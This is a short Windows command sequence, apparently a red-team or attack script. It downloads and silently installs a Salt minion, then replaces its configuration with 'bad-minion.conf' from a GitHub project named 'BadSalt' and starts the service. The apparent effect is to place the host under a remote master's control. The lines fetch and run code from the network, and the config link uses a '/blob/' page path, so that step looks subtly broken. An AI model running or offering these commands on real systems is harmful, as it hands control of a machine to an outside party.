powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('https://repo.saltstack.com/windows/Salt-Minion-2018.3.3-Py2-AMD64-Setup.exe', 'C:\Windows\Temp\saltstack.exe')
C:\Windows\Temp\saltstack.exe /S /master=salt
powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('https://github.com/3ndG4me/BadSalt/blob/master/bad-minion.conf', 'C:\salt\conf\minion')
sc start salt-minion

